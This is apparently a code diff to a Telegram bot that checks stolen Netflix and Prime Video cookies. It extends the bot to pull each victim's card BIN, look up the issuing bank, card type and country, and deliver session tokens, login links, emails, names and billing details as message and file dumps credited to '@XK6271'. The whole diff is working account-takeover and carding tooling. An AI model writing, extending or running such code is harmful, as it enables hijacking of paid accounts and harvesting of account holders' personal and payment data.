@@ -12,6 +12,7 @@ const CHANNELS = [
   { url: "https://t.me/netflixhivea", id: "@netflixhivea" },
   { url: "https://t.me/allichetools", id: "@allichetools" },
   { url: "https://t.me/+9njmxL1yJuA4YjE6", id: "" },
+  { url: "https://t.me/+zBedda3BFAphZjIx", id: "" },
 ];
 
 export function setupBot() {
@@ -177,6 +178,37 @@ export function setupBot() {
     return cookies;
   }
 
+  interface BinInfo {
+    brand?: string;
+    type?: string;
+    level?: string;
+    bank?: string;
+    country?: string;
+    countryFlag?: string;
+  }
+
+  async function lookupBin(cardLast4: string, fullBin?: string): Promise<BinInfo | null> {
+    if (!fullBin || fullBin.length < 6) return null;
+    const bin = fullBin.replace(/\D/g, "").substring(0, 6);
+    if (bin.length < 6) return null;
+    try {
+      const res = await fetch(`https://lookup.binlist.net/${bin}`, {
+        headers: { "Accept-Version": "3" },
+        signal: AbortSignal.timeout(5000),
+      });
+      if (res.status !== 200) return null;
+      const data: any = await res.json();
+      return {
+        brand: data.scheme || undefined,
+        type: data.type || undefined,
+        level: data.brand || undefined,
+        bank: data.bank?.name || undefined,
+        country: data.country?.alpha2 || undefined,
+        countryFlag: data.country?.emoji || undefined,
+      };
+    } catch { return null; }
+  }
+
   interface NFCheckResult {
     success: boolean;
     token?: string;
@@ -192,6 +224,8 @@ export function setupBot() {
     nextBilling?: string;
     payment?: string;
     cardInfo?: string;
+    cardBin?: string;
+    binInfo?: BinInfo;
     phone?: string;
     quality?: string;
     streams?: string;
@@ -363,6 +397,9 @@ export function setupBot() {
           const card = findInObj(ctx, "lastFourDigits") || findInObj(ctx, "cardLastFourDigits");
           if (card) result.cardInfo = `****${card}`;
 
+          const cardBin = findInObj(ctx, "bin") || findInObj(ctx, "cardBin") || findInObj(ctx, "firstSixDigits");
+          if (cardBin) result.cardBin = String(cardBin);
+
           result.membershipStatus = findInObj(ctx, "membershipStatus") || findInObj(ctx, "userStatus");
           result.quality = findInObj(ctx, "videoQuality") || findInObj(ctx, "hdAvailable") ? "HD/UHD" : "";
 
@@ -381,6 +418,12 @@ export function setupBot() {
           }
         }
       } catch {}
+
+      if (result.cardBin) {
+        try {
+          result.binInfo = await lookupBin(result.cardInfo || "", result.cardBin) || undefined;
+        } catch {}
+      }
 
       return result;
     } catch (err: any) {
@@ -469,10 +512,47 @@ export function setupBot() {
     if (h.nextBilling) msg += `💳 <b>Next Billing:</b> ${esc(h.nextBilling)}\n`;
     if (h.payment) msg += `💲 <b>Payment:</b> ${esc(h.payment)}\n`;
     if (h.cardInfo) msg += `🏦 <b>Card:</b> ${esc(h.cardInfo)}\n`;
+    if (h.binInfo) {
+      msg += `\n💳 <b>BIN Info:</b>\n`;
+      if (h.binInfo.brand) msg += `  • Brand: ${esc(h.binInfo.brand.toUpperCase())}\n`;
+      if (h.binInfo.type) msg += `  • Type: ${esc(h.binInfo.type)}\n`;
+      if (h.binInfo.level) msg += `  • Level: ${esc(h.binInfo.level)}\n`;
+      if (h.binInfo.bank) msg += `  • Bank: ${esc(h.binInfo.bank)}\n`;
+      if (h.binInfo.country) msg += `  • Country: ${h.binInfo.countryFlag || ""} ${esc(h.binInfo.country)}\n`;
+    }
     if (h.profiles && h.profiles.length > 0) msg += `👥 <b>Profiles (${h.profiles.length}):</b> ${h.profiles.map(esc).join(", ")}\n`;
+    if (h.quality) msg += `📺 <b>Quality:</b> ${esc(h.quality)}\n`;
     msg += `\n🔗 <b>Token:</b> <code>${esc(h.token || "")}</code>\n`;
     msg += `\n🔗 <a href="${esc(h.loginUrl || "")}">Click here to login</a>`;
+    msg += `\n\n<i>Checked by @XK6271</i>`;
     return msg;
+  }
+
+  function formatNFHitPlain(h: NFCheckResult, idx: number): string {
+    const flag = getCountryFlag(h.country || "");
+    let line = `═══ Hit #${idx} ═══\n`;
+    line += `${flag} Country: ${h.countryName || h.country || "Unknown"}\n`;
+    line += `Plan: ${h.plan || "Unknown"}\n`;
+    if (h.price) line += `Price: ${h.price}\n`;
+    if (h.email) line += `Email: ${h.email}\n`;
+    if (h.name) line += `Name: ${h.name}\n`;
+    if (h.memberSince) line += `Member Since: ${h.memberSince}\n`;
+    if (h.nextBilling) line += `Next Billing: ${h.nextBilling}\n`;
+    if (h.payment) line += `Payment: ${h.payment}\n`;
+    if (h.cardInfo) line += `Card: ${h.cardInfo}\n`;
+    if (h.binInfo) {
+      line += `BIN Info:\n`;
+      if (h.binInfo.brand) line += `  Brand: ${h.binInfo.brand.toUpperCase()}\n`;
+      if (h.binInfo.type) line += `  Type: ${h.binInfo.type}\n`;
+      if (h.binInfo.level) line += `  Level: ${h.binInfo.level}\n`;
+      if (h.binInfo.bank) line += `  Bank: ${h.binInfo.bank}\n`;
+      if (h.binInfo.country) line += `  Country: ${h.binInfo.country}\n`;
+    }
+    if (h.profiles && h.profiles.length > 0) line += `Profiles (${h.profiles.length}): ${h.profiles.join(", ")}\n`;
+    if (h.quality) line += `Quality: ${h.quality}\n`;
+    line += `Token: ${h.token || ""}\n`;
+    line += `Login: ${h.loginUrl || ""}\n`;
+    return line;
   }
 
   function formatPrimeHit(h: PrimeCheckResult, idx: number): string {
@@ -1075,6 +1155,7 @@ export function setupBot() {
       let hits = 0;
       let dead = 0;
       let stopped = false;
+      const tokenHits: { token: string; country: string; plan: string; loginUrl: string }[] = [];
 
       for (let i = 0; i < toCheck.length; i++) {
         if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
@@ -1093,8 +1174,9 @@ export function setupBot() {
             hits++;
             const flag = getCountryFlag(result.country || "");
             const loginUrl = result.loginUrl || `https://netflix.com/account?nftoken=${result.token}`;
+            tokenHits.push({ token: result.token, country: result.countryName || "Unknown", plan: result.plan || "Unknown", loginUrl });
             await bot.sendMessage(chatId,
-              `🔑 <b>Token #${hits}</b>\n${flag} ${esc(result.countryName || "Unknown")} | ${esc(result.plan || "Unknown")}\n🔗 <a href="${esc(loginUrl)}">Login Link</a>\n<code>${esc(result.token)}</code>`,
+              `🔑 <b>Token #${hits}</b>\n${flag} ${esc(result.countryName || "Unknown")} | ${esc(result.plan || "Unknown")}\n🔗 <a href="${esc(loginUrl)}">Login Link</a>\n<code>${esc(result.token)}</code>\n\n<i>by @XK6271</i>`,
               { parse_mode: "HTML", disable_web_page_preview: true }
             );
           } else {
@@ -1111,6 +1193,16 @@ export function setupBot() {
           { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
         );
       } catch {}
+
+      if (tokenHits.length > 0) {
+        let fileContent = `NF Tokens - ${new Date().toLocaleString()}\nGenerated by @XK6271\n${"═".repeat(40)}\n\n`;
+        tokenHits.forEach((t, i) => {
+          fileContent += `═══ Token #${i + 1} ═══\nCountry: ${t.country}\nPlan: ${t.plan}\nToken: ${t.token}\nLogin: ${t.loginUrl}\n\n`;
+        });
+        fileContent += `${"═".repeat(40)}\nTotal Tokens: ${tokenHits.length}\nGenerated by @XK6271`;
+        const buf = Buffer.from(fileContent, "utf8");
+        await bot.sendDocument(chatId, buf, { caption: `🔑 ${tokenHits.length} NF Tokens | by @XK6271` }, { filename: `nf_tokens_${Date.now()}.txt`, contentType: "text/plain" });
+      }
 
       delete pending[userId];
       return;
@@ -1159,6 +1251,7 @@ export function setupBot() {
       let dead = 0;
       let errors = 0;
       let stopped = false;
+      const hitResults: NFCheckResult[] = [];
 
       for (let i = 0; i < toCheck.length; i++) {
         if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
@@ -1176,6 +1269,7 @@ export function setupBot() {
 
           if (result.success) {
             hits++;
+            hitResults.push(result);
             await bot.sendMessage(chatId, formatNFHit(result, hits), { parse_mode: "HTML", disable_web_page_preview: true });
           } else {
             dead++;
@@ -1193,6 +1287,14 @@ export function setupBot() {
           { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
         );
       } catch {}
+
+      if (hitResults.length > 0) {
+        let fileContent = `Netflix Hits - ${new Date().toLocaleString()}\nChecked by @XK6271\n${"═".repeat(40)}\n\n`;
+        hitResults.forEach((h, i) => { fileContent += formatNFHitPlain(h, i + 1) + "\n"; });
+        fileContent += `\n${"═".repeat(40)}\nTotal Hits: ${hitResults.length}\nChecked by @XK6271`;
+        const buf = Buffer.from(fileContent, "utf8");
+        await bot.sendDocument(chatId, buf, { caption: `📄 ${hitResults.length} Netflix Hits | by @XK6271` }, { filename: `netflix_hits_${Date.now()}.txt`, contentType: "text/plain" });
+      }
 
       delete pending[userId];
       return;
@@ -1241,6 +1343,7 @@ export function setupBot() {
       let dead = 0;
       let errors = 0;
       let stopped = false;
+      const primeHits: PrimeCheckResult[] = [];
 
       for (let i = 0; i < toCheck.length; i++) {
         if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
@@ -1258,7 +1361,8 @@ export function setupBot() {
 
           if (result.success && result.isPrime) {
             hits++;
-            await bot.sendMessage(chatId, formatPrimeHit(result, hits), { parse_mode: "HTML" });
+            primeHits.push(result);
+            await bot.sendMessage(chatId, formatPrimeHit(result, hits) + `\n<i>Checked by @XK6271</i>`, { parse_mode: "HTML" });
           } else {
             dead++;
           }
@@ -1275,6 +1379,22 @@ export function setupBot() {
           { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
         );
       } catch {}
+
+      if (primeHits.length > 0) {
+        let fileContent = `Prime Video Hits - ${new Date().toLocaleString()}\nChecked by @XK6271\n${"═".repeat(40)}\n\n`;
+        primeHits.forEach((h, i) => {
+          fileContent += `═══ Hit #${i + 1} ═══\n`;
+          fileContent += `Country: ${h.countryName || h.country || "Unknown"}\n`;
+          fileContent += `Prime: ${h.isPrime ? "Active" : "No"}\n`;
+          if (h.name) fileContent += `Name: ${h.name}\n`;
+          if (h.email) fileContent += `Email: ${h.email}\n`;
+          if (h.marketplace) fileContent += `Marketplace: ${h.marketplace}\n`;
+          fileContent += `\n`;
+        });
+        fileContent += `${"═".repeat(40)}\nTotal Hits: ${primeHits.length}\nChecked by @XK6271`;
+        const buf = Buffer.from(fileContent, "utf8");
+        await bot.sendDocument(chatId, buf, { caption: `📄 ${primeHits.length} Prime Hits | by @XK6271` }, { filename: `prime_hits_${Date.now()}.txt`, contentType: "text/plain" });
+      }
 
       delete pending[userId];
       return;
